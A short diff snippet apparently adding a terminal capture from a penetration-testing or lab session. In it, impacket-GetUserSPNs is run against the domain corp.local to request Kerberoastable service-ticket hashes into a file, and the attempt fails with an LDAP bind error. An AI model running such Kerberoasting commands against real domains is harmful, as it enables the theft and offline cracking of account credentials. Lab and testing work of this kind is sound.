@@ -1,0 +1,7 @@
+└─$ impacket-GetUserSPNs corp.local/ \
+  -dc-ip 192.168.100.10 \
+  -request \
+  -outputfile kerberoast_hashes.txt
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563
